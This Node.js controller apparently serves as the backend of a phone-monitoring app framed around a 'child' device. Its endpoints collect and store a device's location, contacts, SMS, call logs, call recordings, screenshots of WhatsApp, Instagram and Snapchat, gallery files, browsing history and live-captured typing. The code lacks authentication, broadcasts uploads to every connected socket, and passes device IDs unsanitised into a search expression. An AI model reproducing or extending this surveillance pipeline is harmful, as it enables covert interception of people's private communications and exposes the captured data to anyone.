'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const cloudinary = require('cloudinary').v2;
const deviceService = require('../services/device.service');
const chatService = require('../services/chat.service');
const activityService = require('../services/activity.service');
const dbService = require('../services/database.service');
const { resolveChatAppKey, isStrictChatRecordForApp, notificationApp } = require('../utils/validators');
const constants = require('../config/constants');

function getUploadsDir() {
    return path.join(__dirname, '..', 'uploads');
}

// ─── POST /api/upload-storage-file ──────────────────────────────

async function uploadStorageFile(req, res) {
    try {
        const UPLOADS_DIR = getUploadsDir();
        const id = String(req.headers['x-device-id'] || '').trim().toUpperCase();
        let relPath = String(req.headers['x-file-path'] || 'file.bin').trim();
        const mime = String(req.headers['x-mime'] || 'application/octet-stream');
        const fileName = String(req.headers['x-file-name'] || path.basename(relPath) || 'file.bin');
        if (!id) return res.status(400).json({ error: 'No device id' });
        if (!req.body || !req.body.length) return res.status(400).json({ error: 'Empty body' });
        relPath = relPath.replace(/\\/g, '/').replace(/\0/g, '');
        while (relPath.startsWith('/')) relPath = relPath.slice(1);
        if (relPath.includes('..')) relPath = fileName;
        const filesDir = path.join(UPLOADS_DIR, 'files', id);
        await fs.promises.mkdir(filesDir, { recursive: true });
        const safeBase = fileName.replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 80) || 'file.bin';
        const diskName = Date.now() + '_' + safeBase;
        await fs.promises.writeFile(path.join(filesDir, diskName), req.body);
        const publicUrl = '/uploads/files/' + id + '/' + diskName;
        let type = 'file';
        const lower = fileName.toLowerCase();
        if (/\.(jpg|jpeg|png|webp|gif)$/.test(lower)) type = 'image';
        else if (/\.(mp4|mkv|webm|3gp|avi|mov)$/.test(lower)) type = 'video';
        else if (/\.(mp3|m4a|aac|wav|ogg)$/.test(lower)) type = 'audio';
        const meta = { name: fileName, path: relPath, size: req.body.length, type, mime, url: publicUrl, timestamp: Date.now() };
        const metaPath = path.join(UPLOADS_DIR, id + '_storage_file.json');
        const tmp = metaPath + '.tmp';
        await fs.promises.writeFile(tmp, JSON.stringify(meta));
        await fs.promises.rename(tmp, metaPath);
        res.json({ status: 'success', ...meta });
    } catch (e) {
        console.error('upload-storage-file', e);
        res.status(500).json({ error: e.message });
    }
}

// ─── POST /api/upload-gallery-fallback-binary ───────────────────

async function uploadGalleryFallbackBinary(req, res, io) {
    const headers = req.headers || {};
    const id = String(headers['x-device-id'] || '').trim().toUpperCase();
    const mediaId = String(headers['x-media-id'] || '').trim();
    const name = String(headers['x-file-name'] || 'gallery-media').trim();
    const mime = String(headers['x-mime'] || 'application/octet-stream').trim().toLowerCase();
    const modifiedAt = Number(headers['x-modified-at'] || Date.now());
    if (!id || !mediaId || !req.body || !req.body.length) return res.status(400).json({ error: 'Missing gallery binary data' });
    const safeId = mediaId.replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 120) || `${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    const resourceType = mime.startsWith('video/') ? 'video' : 'image';
    const suffix = resourceType === 'video' ? '.video' : '.jpg';
    const tmpPath = path.join(os.tmpdir(), `gallery_${crypto.randomBytes(12).toString('hex')}${suffix}`);
    try {
        await fs.promises.writeFile(tmpPath, req.body);
        const options = {
            folder: `${id}/gallery`, public_id: safeId, resource_type: resourceType,
            width: resourceType === 'image' ? 1280 : undefined,
            quality: resourceType === 'image' ? 'auto' : undefined,
            fetch_format: resourceType === 'image' ? 'auto' : undefined,
            chunk_size: resourceType === 'video' ? 6 * 1024 * 1024 : undefined
        };
        const onUploaded = async (error, result) => {
            try { await fs.promises.unlink(tmpPath); } catch (ignored) { }
            if (error) return res.status(500).json({ error: 'Gallery binary fallback upload failed' });
            const item = {
                id: safeId, url: result.secure_url, name,
                mime: resourceType === 'video' ? mime : 'image/jpeg', type: resourceType,
                size: Number(headers['x-size'] || result.bytes || req.body.length), modifiedAt,
                source: 'cloudinary-fallback', publicId: result.public_id, resourceType
            };
            io.to(id).emit('new-file', { device_id: id, ...item });
            res.json({ status: 'success', item });
        };
        if (resourceType === 'video') cloudinary.uploader.upload_large(tmpPath, options, onUploaded);
        else cloudinary.uploader.upload(tmpPath, options, onUploaded);
    } catch (error) {
        try { await fs.promises.unlink(tmpPath); } catch (ignored) { }
        res.status(500).json({ error: 'Gallery binary fallback failed' });
    }
}

// ─── POST /api/upload-image ─────────────────────────────────────

function uploadImage(req, res, io) {
    let { device_id, image_data, type } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    let folderName = "gallery";
    let publicId = Date.now().toString();
    if (type && type.includes("-")) {
        const parts = type.split("-");
        folderName = parts[0];
        publicId = parts[1];
    } else if (type && type !== "null" && type !== "") {
        folderName = type;
    }
    const tl = (folderName || '').toLowerCase();
    if (tl.includes('whatsapp')) folderName = 'whatsappscreenshot';
    else if (tl.includes('instagram')) folderName = 'instagramscreenshot';
    else if (tl.includes('snap')) folderName = 'snapscreenshot';
    else if (tl === 'screenshot' || tl === 'screen') folderName = 'screenshot';
    let folderPath = `${id}/${folderName}`;
    let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;
    cloudinary.uploader.upload(base64Image,
        { folder: folderPath, public_id: publicId, resource_type: "image", width: 1280, quality: "auto", fetch_format: "auto" },
        (error, result) => {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            io.emit('new-file', { device_id: id, url: result.secure_url, type: folderName });
            res.json({ status: "success", url: result.secure_url });
        }
    );
}

// ─── POST /api/upload-audio ─────────────────────────────────────

function uploadAudio(req, res, io) {
    let { device_id, audio_data, filename } = req.body;
    if (!device_id || !audio_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    let folderPath = `${id}/calls`;
    let base64Audio = audio_data.startsWith('data:audio') ? audio_data : "data:audio/mp4;base64," + audio_data;
    cloudinary.uploader.upload(base64Audio,
        { folder: folderPath, public_id: filename || Date.now().toString(), resource_type: "video" },
        (error, result) => {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            io.emit('new-audio', { device_id: id, url: result.secure_url, name: filename });
            res.json({ status: "success", url: result.secure_url });
        }
    );
}

// ─── GET /api/audio-history/:device_id ──────────────────────────

async function audioHistory(req, res) {
    const id = req.params.device_id.trim().toUpperCase();
    try {
        const result = await cloudinary.search.expression(`folder:${id}/calls AND resource_type:video`).sort_by('created_at', 'desc').max_results(50).execute();
        res.json(result.resources);
    } catch (error) { res.json([]); }
}

// ─── POST /api/upload_data ──────────────────────────────────────

async function uploadData(req, res, io) {
    try {
        const UPLOADS_DIR = getUploadsDir();
        const body = req.body || {};
        let device_id = body.device_id || body.deviceId || body.childId || body.child_id || body.id || req.headers['x-device-id'];
        let type = body.type || body.dataType || 'unknown';
        let data = body.data !== undefined ? body.data : body.payload;
        if (!device_id) {
            console.warn('[upload_data] No device id. body keys=', Object.keys(body));
            return res.status(400).json({ error: "No ID", keys: Object.keys(body) });
        }
        const db = require('../config/db');
        if (type === 'chat_logs' && !(await db.ensureReady())) {
            console.error('[CHAT_LOG_RETRYABLE_FAILURE]', JSON.stringify({ childId: device_id, reason: 'mongo_not_ready' }));
            return res.status(503).json({ status: "error", retryable: true, reason: "mongo_not_ready" });
        }
        const id = device_id.toString().trim().toUpperCase();
        const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
        try {
            let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
            let finalData = parsedData;

            if (type === 'location') {
                const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
                if (locObj && (locObj.lat || locObj.latitude)) {
                    deviceService.setDevice(id, {
                        lat: locObj.lat || locObj.latitude,
                        lon: locObj.lon || locObj.longitude || locObj.lng,
                        lastSeen: Date.now()
                    });
                }
                finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
            } else if (type === 'contacts') {
                let rawList = Array.isArray(parsedData) ? parsedData : [parsedData];
                const seenNumbers = new Set();
                finalData = [];
                for (const contact of rawList) {
                    let rawNum = contact.phoneNumber || contact.number || '';
                    let num = rawNum.replace(/\s+|-/g, '');
                    if (num && !seenNumbers.has(num)) {
                        seenNumbers.add(num);
                        finalData.push({ name: contact.name || "Unknown", number: num });
                    }
                }
                finalData.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
            } else if (type === 'permission_status') {
                finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
            } else if (type === 'app_visibility') {
                finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
            } else if (['installed_apps', 'apps'].includes(type)) {
                let incoming = Array.isArray(parsedData) ? parsedData : [parsedData];
                let existing = [];
                try {
                    if (fs.existsSync(filePath)) {
                        existing = JSON.parse(await fs.promises.readFile(filePath, 'utf8'));
                        if (!Array.isArray(existing)) existing = [];
                    }
                } catch (e) { existing = []; }
                const map = new Map();
                for (const a of existing) if (a && a.packageName) map.set(a.packageName, a);
                for (const a of incoming) if (a && a.packageName) map.set(a.packageName, a);
                finalData = Array.from(map.values());
            } else if (type === 'network') {
                finalData = parsedData;
            } else if (type === 'storage' || type === 'storage_file') {
                finalData = parsedData;
            } else if (type === 'live_status') {
                // ─── Live Activity processing ───────────────────
                let incoming = Array.isArray(parsedData) ? parsedData : [parsedData];
                let existing = [];
                try {
                    if (fs.existsSync(filePath)) {
                        existing = JSON.parse(await fs.promises.readFile(filePath, 'utf8'));
                        if (!Array.isArray(existing)) existing = [];
                    }
                } catch (e) { existing = []; }
                finalData = [...incoming, ...existing]
                    .sort((a, b) => Number(b && b.timestamp || 0) - Number(a && a.timestamp || 0))
                    .slice(0, constants.MAX_LIVE_STATUS_RECORDS);

                try {
                    const now = Date.now();
                    const STABLE_MS = constants.LIVE_TYPING_STABLE_MS;
                    for (const raw of incoming) {
                        const rawText = (raw && (raw.text || raw.activity || '')).toString().trim();
                        const ts = Number(raw && raw.timestamp || now);
                        const hasStructured = !!(raw && (raw.application || raw.packageName || raw.actorName || raw.message || raw.action || raw.eventId));
                        const suppliedApplication = hasStructured ? String(raw.application || '').trim() : '';
                        const suppliedPackage = hasStructured ? String(raw.packageName || '').trim() : '';
                        const suppliedActor = hasStructured ? String(raw.actorName || '').trim() : '';
                        const suppliedAction = hasStructured ? String(raw.action || 'activity').trim().toLowerCase() : '';
                        const suppliedMessage = hasStructured ? String(raw.message || '').trim() : '';
                        const suppliedEventId = hasStructured ? String(raw.eventId || '').trim() : '';
                        const structured = hasStructured
                            ? {
                                application: suppliedApplication || 'Other',
                                packageName: suppliedPackage,
                                actorName: suppliedActor,
                                action: suppliedAction || 'activity',
                                message: suppliedMessage || rawText,
                                eventId: suppliedEventId
                            }
                            : (rawText ? activityService.parseLiveActivityText(rawText) : null);
                        const text = rawText || (structured ? [structured.application, structured.actorName ? ('\u2192 ' + structured.actorName) : '', structured.message ? (': ' + structured.message) : ''].filter(Boolean).join(' ').trim() : '');

                        const previousLiveTs = activityService.getLatestLiveTimestamp(id);
                        if (ts < previousLiveTs) {
                            console.log('[LIVE_STALE_UPDATE_IGNORED]', JSON.stringify({ childId: id, timestamp: ts, latest: previousLiveTs }));
                            continue;
                        }
                        activityService.setLatestLiveTimestamp(id, ts);

                        const livePayload = {
                            device_id: id, text: text || '',
                            application: structured ? structured.application : '',
                            packageName: structured ? structured.packageName : '',
                            actorName: structured ? structured.actorName : '',
                            action: structured ? structured.action : '',
                            message: structured ? structured.message : '',
                            timestamp: ts,
                            eventId: structured ? (structured.eventId || '') : '',
                            liveOnly: true
                        };
                        try {
                            io.to(id).emit('live_status_update', livePayload);
                            io.to(id).emit('activity_update', livePayload);
                        } catch (e) { }

                        const prev = activityService.getTypingState(id);

                        if (!text) {
                            activityService.discardTypingState(id);
                            continue;
                        }
                        if (!structured) continue;

                        if ((structured.action || '').toLowerCase() === 'call') {
                            const callState = { text, structured, firstSeen: ts, lastSeen: ts, saved: false, timer: null };
                            await activityService.commitFinalActivity(id, callState, io);
                            activityService.discardTypingState(id);
                            continue;
                        }

                        if ((structured.action || '').toLowerCase() === 'sent') {
                            const sentState = { text, structured: { ...structured, action: 'sent' }, firstSeen: ts, lastSeen: ts, saved: false, timer: null };
                            await activityService.commitFinalActivity(id, sentState, io);
                            activityService.discardTypingState(id);
                            console.log('[Activity] FINAL saved for', id, structured.message && structured.message.slice(0, 40));
                            continue;
                        }

                        if (!prev || !prev.text) {
                            activityService.setTypingState(id, { text, structured, firstSeen: ts, lastSeen: ts, saved: false, timer: null });
                            activityService.scheduleFinalize(id, STABLE_MS);
                            continue;
                        }

                        if (prev.text === text) {
                            prev.lastSeen = ts;
                            activityService.scheduleFinalize(id, STABLE_MS);
                            continue;
                        }

                        if (activityService.sameComposer(prev.structured, structured)) {
                            if (prev.timer) { try { clearTimeout(prev.timer); } catch (e) { } }
                            activityService.setTypingState(id, { text, structured, firstSeen: prev.firstSeen, lastSeen: ts, saved: false, timer: null });
                            activityService.scheduleFinalize(id, STABLE_MS);
                            continue;
                        }

                        if (!prev.saved) {
                            await activityService.commitFinalActivity(id, prev, io);
                        }
                        activityService.setTypingState(id, { text, structured, firstSeen: ts, lastSeen: ts, saved: false, timer: null });
                        activityService.scheduleFinalize(id, STABLE_MS);
                    }
                } catch (e) {
                    try { io.to(id).emit('live_status_update', { device_id: id, text: (incoming[0] && incoming[0].text) || '' }); } catch (e2) { }
                }
            } else if (['call_logs', 'sms'].includes(type)) {
                finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
            } else if (type === 'chat_logs') {
                let incoming = Array.isArray(parsedData)
                    ? parsedData
                    : (parsedData && Array.isArray(parsedData.messages) ? parsedData.messages : [parsedData]);
                incoming = incoming.map(chatService.normalizeChatMessage)
                    .filter(m => m && (m.text || m.message));

                const { isBadChatConversation, isBadChatText } = require('../utils/validators');
                incoming = incoming.filter(m => !isBadChatConversation(m.conversation) && !isBadChatText(m.text || m.message));

                const byApp = chatService.groupByApp(incoming);
                const changedApps = [];
                let mongoFailureCount = 0;
                let mongoSavedCount = 0;

                for (const appKey of Object.keys(byApp)) {
                    const list = byApp[appKey];
                    if (!list.length) continue;
                    try {
                        const n = await dbService.saveChatMessages(id, appKey, list);
                        mongoSavedCount += Number(n) || 0;
                        console.log('[CHAT_LOG_MONGO_RESULT]', JSON.stringify({ childId: id, app: appKey, received: list.length, saved: n }));
                        try {
                            const chatsDir = path.join(UPLOADS_DIR, 'chats', id);
                            if (!fs.existsSync(chatsDir)) fs.mkdirSync(chatsDir, { recursive: true });
                            const chatPath = path.join(chatsDir, `${appKey}.json`);
                            let existing = [];
                            try { if (fs.existsSync(chatPath)) existing = JSON.parse(await fs.promises.readFile(chatPath, 'utf8')); } catch (e) { existing = []; }
                            for (const safeMsg of list) {
                                const duplicate = existing.some(item => item.conversation === safeMsg.conversation && item.text === safeMsg.text && Math.abs((item.timestamp || 0) - safeMsg.timestamp) < 5000);
                                if (!duplicate) existing.unshift(safeMsg);
                            }
                            await fs.promises.writeFile(chatPath, JSON.stringify(existing.slice(0, 5000)));
                        } catch (fe) { console.warn('[chat_logs] file mirror', fe.message); }
                        changedApps.push(appKey);
                    } catch (e) {
                        mongoFailureCount++;
                        console.error('[CHAT_LOG_MONGO_ERROR]', JSON.stringify({ childId: id, app: appKey, error: e && e.message }));
                    }
                }

                changedApps.forEach(appKey => {
                    const latest = byApp[appKey][byApp[appKey].length - 1] || byApp[appKey][0];
                    const update = {
                        device_id: id, app: appKey,
                        contact: latest && latest.conversation,
                        contactName: latest && latest.contactName,
                        conversation: latest && latest.conversation,
                        chat_with: latest && latest.conversation,
                        text: latest && latest.text,
                        message: latest && latest.text,
                        timestamp: latest && latest.timestamp,
                        direction: latest && latest.direction,
                        sender: latest && latest.sender,
                        eventId: latest && latest.eventId
                    };
                    try { io.to(id).emit('chat_update', update); } catch (e) { }
                });

                finalData = incoming;
                if (mongoFailureCount > 0) {
                    console.error('[CHAT_LOG_RETRYABLE_FAILURE]', JSON.stringify({ childId: id, mongoFailures: mongoFailureCount, mongoSaved: mongoSavedCount }));
                    return res.status(503).json({ status: "error", retryable: true, mongoFailures: mongoFailureCount, saved: mongoSavedCount });
                }
            } else if (type === 'websites') {
                let existingData = [];
                try {
                    if (fs.existsSync(filePath)) {
                        existingData = JSON.parse(await fs.promises.readFile(filePath, 'utf8'));
                    }
                } catch (e) { }
                let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
                newDataArray.forEach(newItem => {
                    const isDup = existingData.some(e => e.url === newItem.url && Math.abs((e.timestamp || 0) - (newItem.timestamp || 0)) < 10000);
                    if (!isDup) existingData.unshift(newItem);
                });
                finalData = existingData.slice(0, 5000);
            } else {
                let existingData = [];
                try {
                    if (fs.existsSync(filePath)) {
                        const fileContent = await fs.promises.readFile(filePath, 'utf8');
                        existingData = JSON.parse(fileContent);
                    }
                } catch (e) { }
                let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
                if (type === 'chat_logs') {
                    newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
                }
                finalData = [...newDataArray, ...existingData].slice(0, 5000);
            }

            await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
            try {
                if (constants.PERSIST_DATA_TYPES.includes(type)) {
                    dbService.saveHistory(id, type, finalData).catch(() => { });
                }
            } catch (e) { }
            io.to(id).emit('device_data_update', { device_id: id, type });
            if (type === 'chat_logs') console.log('[chat_logs] saved for', id);
            res.json({ status: "success" });
        } catch (error) {
            console.error('[upload_data] error', type, error && error.message);
            if (type === 'chat_logs') return res.status(503).json({ status: "error", retryable: true, message: String(error && error.message || error) });
            res.status(500).json({ status: "error", message: String(error && error.message || error) });
        }
    } catch (outer) {
        console.error('[upload_data] outer', outer && outer.message);
        res.status(500).json({ status: "error" });
    }
}

// ─── GET /api/get-data/:device_id/:type ─────────────────────────

async function getData(req, res) {
    const UPLOADS_DIR = getUploadsDir();
    const deviceIdParam = req.params.device_id.toUpperCase();
    const typeParam = req.params.type;
    const legacyChatApp = ({
        whatsapp_chat: 'whatsapp',
        instagram_chat: 'instagram',
        snapchat_chat: 'snapchat'
    })[typeParam];
    const filePath = path.join(UPLOADS_DIR, `${deviceIdParam}_${typeParam}.json`);
    try {
        if (legacyChatApp) {
            try {
                const chatRows = await dbService.loadChatMessages(
                    deviceIdParam, legacyChatApp, req.query.contact || 'all', req.query.limit || 5000
                );
                if (Array.isArray(chatRows) && chatRows.length) return res.json(chatRows);
            } catch (e) { }
            const chatFile = path.join(UPLOADS_DIR, 'chats', deviceIdParam, `${legacyChatApp}.json`);
            try {
                if (fs.existsSync(chatFile)) {
                    const rows = JSON.parse(await fs.promises.readFile(chatFile, 'utf8'));
                    const scopedRows = (Array.isArray(rows) ? rows : []).filter(row => isStrictChatRecordForApp(row, legacyChatApp));
                    if (scopedRows.length) return res.json(scopedRows);
                }
            } catch (e) { }
        }
        if (fs.existsSync(filePath)) {
            const raw = (await fs.promises.readFile(filePath, 'utf8')).trim();
            if (raw) {
                try {
                    const parsed = JSON.parse(raw);
                    if (typeParam === 'notifications' && req.query.app) {
                        const requestedApp = String(req.query.app).toLowerCase().trim();
                        const rows = Array.isArray(parsed) ? parsed : [parsed];
                        return res.json(rows.filter(row => notificationApp(row) === requestedApp));
                    }
                    return res.json(parsed);
                } catch (e) { }
            }
        }
        try {
            const fromDb = await dbService.loadHistory(deviceIdParam, typeParam, req.query.limit || 500);
            if (fromDb !== null && fromDb !== undefined) return res.json(fromDb);
        } catch (e) { }
        return res.json([]);
    } catch (e) { res.json([]); }
}

// ─── GET /api/folder-list/:device_id/:folder ────────────────────

function folderList(req, res) {
    const id = req.params.device_id.toUpperCase();
    let folder = String(req.params.folder || 'screenshot').replace(/[^a-zA-Z0-9_-]/g, '');
    cloudinary.api.resources({
        type: 'upload', prefix: id + '/' + folder + '/', max_results: 100, direction: 'desc',
        next_cursor: req.query.next_cursor || null
    }, (error, result) => {
        if (error) return res.json({ photos: [], next_cursor: null });
        const photos = (result.resources || []).map(img => img.secure_url);
        res.json({ photos, next_cursor: result.next_cursor || null, folder });
    });
}

module.exports = {
    uploadStorageFile,
    uploadGalleryFallbackBinary,
    uploadImage,
    uploadAudio,
    audioHistory,
    uploadData,
    getData,
    folderList
};
